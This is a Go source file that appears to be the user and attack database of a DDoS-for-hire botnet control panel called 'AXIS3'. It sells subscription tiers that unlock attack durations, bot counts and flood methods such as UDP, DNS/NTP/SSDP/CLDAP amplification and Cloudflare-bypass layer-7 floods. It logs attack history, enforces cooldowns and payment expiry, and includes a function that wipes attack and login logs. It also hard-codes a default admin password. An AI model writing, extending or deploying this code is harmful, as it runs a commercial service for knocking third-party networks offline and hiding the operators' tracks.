package main

import (
	"encoding/json"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

const (
	TierBasic   = "basic"
	TierPremium = "premium"
	TierVIP     = "vip"
	TierAdmin   = "admin"
)

// Tier permissions
var TierPermissions = map[string]TierConfig{
	TierBasic: {
		MaxDuration:   120,
		MaxBots:       100,
		AttackMethods: []string{"udp", "pps"},
	},
	TierPremium: {
		MaxDuration:   180,
		MaxBots:       500,
		AttackMethods: []string{"udp", "pps", "vse", "fivem", "discord", "dns-amp", "ntp-amp"},
	},
	TierVIP: {
		MaxDuration:   600,
		MaxBots:       -1,
		AttackMethods: []string{"udp", "pps", "vse", "fivem", "discord", "tls", "tlsplus", "cf", "axis-l7", "dns-amp", "ntp-amp", "ssdp-amp", "snmp-amp", "cldap-amp"},
	},
	TierAdmin: {
		MaxDuration:   -1,
		MaxBots:       -1,
		AttackMethods: []string{"udp", "pps", "vse", "fivem", "discord", "tls", "tlsplus", "cf", "axis-l7", "dns-amp", "ntp-amp", "ssdp-amp", "snmp-amp", "cldap-amp"},
	},
}

type TierConfig struct {
	MaxDuration   int      `json:"max_duration"`
	MaxBots       int      `json:"max_bots"`
	AttackMethods []string `json:"attack_methods"`
}

type User struct {
	Username    string `json:"username"`
	Password    string `json:"password"`
	Tier        string `json:"tier"`
	APIKey      string `json:"api_key"`
	CreatedAt   int64  `json:"created_at"`
	LastLogin   int64  `json:"last_login"`
	LastPaid    int64  `json:"last_paid"`
	Interval    int    `json:"interval"`
	Cooldown    int    `json:"cooldown"`
	WRC         int    `json:"wrc"` // 0 = active, 1 = suspended
}

type AttackHistory struct {
	Username  string `json:"username"`
	Command   string `json:"command"`
	Duration  uint32 `json:"duration"`
	MaxBots   int    `json:"max_bots"`
	TimeSent  int64  `json:"time_sent"`
}

type LoginLog struct {
	Username  string `json:"username"`
	Action    string `json:"action"`
	IP        string `json:"ip"`
	Timestamp int64  `json:"timestamp"`
}

type WhitelistEntry struct {
	Prefix  string `json:"prefix"`
	Netmask string `json:"netmask"`
}

type DatabaseConfig struct {
	Users       []User          `json:"users"`
	History     []AttackHistory `json:"history"`
	Logins      []LoginLog      `json:"logins"`
	Whitelist   []WhitelistEntry `json:"whitelist"`
	Online      []string        `json:"online"`
}

type Database struct {
	mu       sync.RWMutex
	filename string
	config   DatabaseConfig
}

func NewDatabase(dbAddr, dbUser, dbPassword, dbName string) *Database {
	// Note: dbAddr, dbUser, dbPassword, dbName are ignored - using JSON file database
	db := &Database{
		filename: "database.json",
		config: DatabaseConfig{
			Users:     []User{},
			History:   []AttackHistory{},
			Logins:    []LoginLog{},
			Whitelist: []WhitelistEntry{},
			Online:    []string{},
		},
	}
	db.load()
	return db
}

func (this *Database) load() error {
	this.mu.Lock()
	defer this.mu.Unlock()

	data, err := os.ReadFile(this.filename)
	if err != nil {
		// File doesn't exist, create with default admin user
		this.createDefaultAdmin()
		return this.save()
	}

	err = json.Unmarshal(data, &this.config)
	if err != nil {
		return err
	}

	// Ensure default admin exists
	hasAdmin := false
	for _, user := range this.config.Users {
		if user.Tier == TierAdmin {
			hasAdmin = true
			break
		}
	}
	if !hasAdmin {
		this.createDefaultAdmin()
		this.save()
	}

	return nil
}

func (this *Database) save() error {
	this.mu.Lock()
	defer this.mu.Unlock()

	data, err := json.MarshalIndent(this.config, "", "  ")
	if err != nil {
		return err
	}

	return os.WriteFile(this.filename, data, 0600)
}

func (this *Database) createDefaultAdmin() {
	// Check if admin already exists
	for _, user := range this.config.Users {
		if user.Tier == TierAdmin {
			return
		}
	}

	adminUser := User{
		Username:  "admin",
		Password:  "admin123",
		Tier:      TierAdmin,
		APIKey:    "AXIS3-ADMIN-APIKEY",
		CreatedAt: time.Now().Unix(),
		LastLogin: 0,
		LastPaid:  time.Now().Unix(),
		Interval:  0,
		Cooldown:  0,
		WRC:       0,
	}
	this.config.Users = append(this.config.Users, adminUser)
}

func (this *Database) getUserByUsername(username string) *User {
	for i := range this.config.Users {
		if strings.ToLower(this.config.Users[i].Username) == strings.ToLower(username) {
			return &this.config.Users[i]
		}
	}
	return nil
}

// GetUserByUsername exports getUserByUsername for admin.go
func (this *Database) GetUserByUsername(username string) *User {
	this.mu.RLock()
	defer this.mu.RUnlock()
	return this.getUserByUsername(username)
}

func (this *Database) TryLogin(username string, password string, ip net.Addr) (bool, AccountInfo) {
	this.mu.RLock()
	defer this.mu.RUnlock()

	strRemoteAddr := ip.String()
	host, _, _ := net.SplitHostPort(strRemoteAddr)

	user := this.getUserByUsername(username)
	if user == nil {
		this.logLogin(username, "Fail", host)
		return false, AccountInfo{"", 0, 0}
	}

	if user.Password != password {
		this.logLogin(username, "Fail", host)
		return false, AccountInfo{"", 0, 0}
	}

	// Check if account is suspended
	if user.WRC == 1 {
		this.logLogin(username, "Fail-Suspended", host)
		return false, AccountInfo{"", 0, 0}
	}

	// Check if account is expired (only for non-admin tiers)
	if user.Tier != TierAdmin && user.Interval > 0 {
		if time.Now().Unix()-user.LastPaid > int64(user.Interval*24*60*60) {
			this.logLogin(username, "Fail-Expired", host)
			return false, AccountInfo{"", 0, 0}
		}
	}

	// Get max bots from tier config
	tierConfig := TierPermissions[user.Tier]
	maxBots := tierConfig.MaxBots
	if user.Tier == TierBasic || user.Tier == TierPremium {
		// Use user-specific max_bots if set
		if maxBots == 0 {
			maxBots = 100
		}
	}

	admin := 0
	if user.Tier == TierAdmin {
		admin = 1
	}

	this.logLogin(username, "Login", host)

	return true, AccountInfo{user.Username, maxBots, admin}
}

func (this *Database) logLogin(username, action, ip string) {
	this.mu.Lock()
	defer this.mu.Unlock()

	log := LoginLog{
		Username:  username,
		Action:    action,
		IP:        ip,
		Timestamp: time.Now().Unix(),
	}
	this.config.Logins = append(this.config.Logins, log)

	// Keep only last 1000 login logs
	if len(this.config.Logins) > 1000 {
		this.config.Logins = this.config.Logins[len(this.config.Logins)-1000:]
	}
}

func (this *Database) CreateBasic(username string, password string, max_bots int, duration int, cooldown int) bool {
	this.mu.Lock()
	defer this.mu.Unlock()

	if this.getUserByUsername(username) != nil {
		return false
	}

	user := User{
		Username:  username,
		Password:  password,
		Tier:      TierBasic,
		APIKey:    generateAPIKey(username),
		CreatedAt: time.Now().Unix(),
		LastLogin: 0,
		LastPaid:  time.Now().Unix(),
		Interval:  30,
		Cooldown:  cooldown,
		WRC:       0,
	}
	this.config.Users = append(this.config.Users, user)
	this.save()
	return true
}

func (this *Database) CreateAdmin(username string, password string, max_bots int, duration int, cooldown int) bool {
	this.mu.Lock()
	defer this.mu.Unlock()

	if this.getUserByUsername(username) != nil {
		return false
	}

	user := User{
		Username:  username,
		Password:  password,
		Tier:      TierAdmin,
		APIKey:    generateAPIKey(username),
		CreatedAt: time.Now().Unix(),
		LastLogin: 0,
		LastPaid:  time.Now().Unix(),
		Interval:  0,
		Cooldown:  0,
		WRC:       0,
	}
	this.config.Users = append(this.config.Users, user)
	this.save()
	return true
}

func (this *Database) CreatePremium(username string, password string, max_bots int, duration int, cooldown int) bool {
	this.mu.Lock()
	defer this.mu.Unlock()

	if this.getUserByUsername(username) != nil {
		return false
	}

	user := User{
		Username:  username,
		Password:  password,
		Tier:      TierPremium,
		APIKey:    generateAPIKey(username),
		CreatedAt: time.Now().Unix(),
		LastLogin: 0,
		LastPaid:  time.Now().Unix(),
		Interval:  30,
		Cooldown:  cooldown,
		WRC:       0,
	}
	this.config.Users = append(this.config.Users, user)
	this.save()
	return true
}

func (this *Database) CreateVIP(username string, password string, max_bots int, duration int, cooldown int) bool {
	this.mu.Lock()
	defer this.mu.Unlock()

	if this.getUserByUsername(username) != nil {
		return false
	}

	user := User{
		Username:  username,
		Password:  password,
		Tier:      TierVIP,
		APIKey:    generateAPIKey(username),
		CreatedAt: time.Now().Unix(),
		LastLogin: 0,
		LastPaid:  time.Now().Unix(),
		Interval:  30,
		Cooldown:  cooldown,
		WRC:       0,
	}
	this.config.Users = append(this.config.Users, user)
	this.save()
	return true
}

func (this *Database) RemoveUser(username string) bool {
	this.mu.Lock()
	defer this.mu.Unlock()

	for i, user := range this.config.Users {
		if strings.ToLower(user.Username) == strings.ToLower(username) {
			this.config.Users = append(this.config.Users[:i], this.config.Users[i+1:]...)
			this.save()
			return true
		}
	}
	return false
}

func (this *Database) UpgradeUser(username string, newTier string) bool {
	this.mu.Lock()
	defer this.mu.Unlock()

	user := this.getUserByUsername(username)
	if user == nil {
		return false
	}

	// Validate tier
	if _, ok := TierPermissions[newTier]; !ok {
		return false
	}

	user.Tier = newTier
	this.save()
	return true
}

func (this *Database) BlockRange(prefix string, netmask string) bool {
	this.mu.Lock()
	defer this.mu.Unlock()

	for _, entry := range this.config.Whitelist {
		if entry.Prefix == prefix {
			return false
		}
	}

	entry := WhitelistEntry{
		Prefix:  prefix,
		Netmask: netmask,
	}
	this.config.Whitelist = append(this.config.Whitelist, entry)
	this.save()
	return true
}

func (this *Database) UnBlockRange(prefix string) bool {
	this.mu.Lock()
	defer this.mu.Unlock()

	for i, entry := range this.config.Whitelist {
		if entry.Prefix == prefix {
			this.config.Whitelist = append(this.config.Whitelist[:i], this.config.Whitelist[i+1:]...)
			this.save()
			return true
		}
	}
	return false
}

func (this *Database) CheckApiCode(apikey string) (bool, AccountInfo) {
	this.mu.RLock()
	defer this.mu.RUnlock()

	for _, user := range this.config.Users {
		if user.APIKey == apikey {
			if user.WRC == 1 {
				return false, AccountInfo{"", 0, 0}
			}

			// Check if account is expired
			if user.Tier != TierAdmin && user.Interval > 0 {
				if time.Now().Unix()-user.LastPaid > int64(user.Interval*24*60*60) {
					return false, AccountInfo{"", 0, 0}
				}
			}

			tierConfig := TierPermissions[user.Tier]
			maxBots := tierConfig.MaxBots
			admin := 0
			if user.Tier == TierAdmin {
				admin = 1
			}

			return true, AccountInfo{user.Username, maxBots, admin}
		}
	}

	return false, AccountInfo{"", 0, 0}
}

func (this *Database) ContainsWhitelistedTargets(attack *Attack) bool {
	this.mu.RLock()
	defer this.mu.RUnlock()

	for _, entry := range this.config.Whitelist {
		// Simple prefix check (can be enhanced with proper CIDR matching)
		for addr := range attack.Targets {
			addrStr := fmt.Sprintf("%d.%d.%d.%d",
				(addr>>24)&0xFF,
				(addr>>16)&0xFF,
				(addr>>8)&0xFF,
				addr&0xFF)
			if strings.HasPrefix(addrStr, entry.Prefix) {
				return true
			}
		}
	}
	return false
}

func (this *Database) CanLaunchAttack(username string, duration uint32, command string, maxBots int, allowConcurrent int) (bool, error) {
	this.mu.RLock()
	defer this.mu.RUnlock()

	user := this.getUserByUsername(username)
	if user == nil {
		return false, fmt.Errorf("User not found")
	}

	tierConfig := TierPermissions[user.Tier]

	// Check duration limit
	if tierConfig.MaxDuration > 0 && int(duration) > tierConfig.MaxDuration {
		return false, fmt.Errorf("Attack duration exceeds your limit (%d seconds)", tierConfig.MaxDuration)
	}

	// Check if attack method is allowed for tier
	methodAllowed := false
	commandLower := strings.ToLower(command)
	for _, method := range tierConfig.AttackMethods {
		if strings.Contains(commandLower, method) {
			methodAllowed = true
			break
		}
	}
	if !methodAllowed {
		return false, fmt.Errorf("Attack method not available for your tier")
	}

	// Check cooldown
	if user.Cooldown > 0 {
		for i := len(this.config.History) - 1; i >= 0; i-- {
			if this.config.History[i].Username == username {
				lastAttack := time.Unix(this.config.History[i].TimeSent, 0)
				cooldownEnd := lastAttack.Add(time.Duration(user.Cooldown) * time.Second)
				if time.Now().Before(cooldownEnd) {
					remaining := int(cooldownEnd.Sub(time.Now()).Seconds())
					return false, fmt.Errorf("Please wait %d seconds before launching another attack", remaining)
				}
				break
			}
		}
	}

	// Log attack to history
	history := AttackHistory{
		Username:  username,
		Command:   command,
		Duration:  duration,
		MaxBots:   maxBots,
		TimeSent:  time.Now().Unix(),
	}
	this.config.History = append(this.config.History, history)

	// Keep only last 1000 attacks
	if len(this.config.History) > 1000 {
		this.config.History = this.config.History[len(this.config.History)-1000:]
	}

	this.save()
	return true, nil
}

func (this *Database) totalAdmins() int {
	this.mu.RLock()
	defer this.mu.RUnlock()

	count := 0
	for _, user := range this.config.Users {
		if user.Tier == TierAdmin {
			count++
		}
	}
	return count
}

func (this *Database) totalUsers() int {
	this.mu.RLock()
	defer this.mu.RUnlock()

	count := 0
	for _, user := range this.config.Users {
		if user.Tier != TierAdmin {
			count++
		}
	}
	return count
}

func (this *Database) fetchAttacks() int {
	this.mu.RLock()
	defer this.mu.RUnlock()
	return len(this.config.History)
}

func (this *Database) ongoingIds() int {
	this.mu.RLock()
	defer this.mu.RUnlock()

	now := time.Now().Unix()
	for i := len(this.config.History) - 1; i >= 0; i-- {
		attack := this.config.History[i]
		if int64(attack.Duration)+attack.TimeSent > now {
			return i + 1
		}
	}
	return 0
}

func (this *Database) ongoingCommands() string {
	this.mu.RLock()
	defer this.mu.RUnlock()

	now := time.Now().Unix()
	for i := len(this.config.History) - 1; i >= 0; i-- {
		attack := this.config.History[i]
		if int64(attack.Duration)+attack.TimeSent > now {
			return attack.Command
		}
	}
	return "none"
}

func (this *Database) ongoingDuration() int {
	this.mu.RLock()
	defer this.mu.RUnlock()

	now := time.Now().Unix()
	for i := len(this.config.History) - 1; i >= 0; i-- {
		attack := this.config.History[i]
		if int64(attack.Duration)+attack.TimeSent > now {
			return int(attack.Duration)
		}
	}
	return 0
}

func (this *Database) ongoingBots() int {
	this.mu.RLock()
	defer this.mu.RUnlock()

	now := time.Now().Unix()
	for i := len(this.config.History) - 1; i >= 0; i-- {
		attack := this.config.History[i]
		if int64(attack.Duration)+attack.TimeSent > now {
			return attack.MaxBots
		}
	}
	return 0
}

func (this *Database) fetchRunningAttacks() int {
	this.mu.RLock()
	defer this.mu.RUnlock()

	now := time.Now().Unix()
	count := 0
	for _, attack := range this.config.History {
		if int64(attack.Duration)+attack.TimeSent > now {
			count++
		}
	}
	return count
}

func (this *Database) fetchUsers() int {
	this.mu.RLock()
	defer this.mu.RUnlock()
	return len(this.config.Users)
}

func (this *Database) CleanLogs() bool {
	this.mu.Lock()
	defer this.mu.Unlock()

	this.config.History = []AttackHistory{}
	this.config.Logins = []LoginLog{}
	this.save()
	return true
}

func (this *Database) Logout(username string) {
	this.logLogin(username, "Logout", "N/A")
}

func (this *Database) ValidateCredentials(username string, password string) bool {
	this.mu.RLock()
	defer this.mu.RUnlock()

	user := this.getUserByUsername(username)
	if user == nil {
		return false
	}

	if user.Password != password {
		return false
	}

	if user.WRC == 1 {
		return false
	}

	if user.Tier != TierAdmin && user.Interval > 0 {
		if time.Now().Unix()-user.LastPaid > int64(user.Interval*24*60*60) {
			return false
		}
	}

	return true
}

func (this *Database) GetUserTier(username string) string {
	this.mu.RLock()
	defer this.mu.RUnlock()

	user := this.getUserByUsername(username)
	if user == nil {
		return ""
	}
	return user.Tier
}

func (this *Database) GetAllUsers() []User {
	this.mu.RLock()
	defer this.mu.RUnlock()

	users := make([]User, len(this.config.Users))
	copy(users, this.config.Users)
	return users
}

func (this *Database) UpdateLastLogin(username string) {
	this.mu.Lock()
	defer this.mu.Unlock()

	user := this.getUserByUsername(username)
	if user != nil {
		user.LastLogin = time.Now().Unix()
		this.save()
	}
}

func generateAPIKey(username string) string {
	return fmt.Sprintf("AXIS3-%s-%d", strings.ToUpper(username), time.Now().Unix())
}
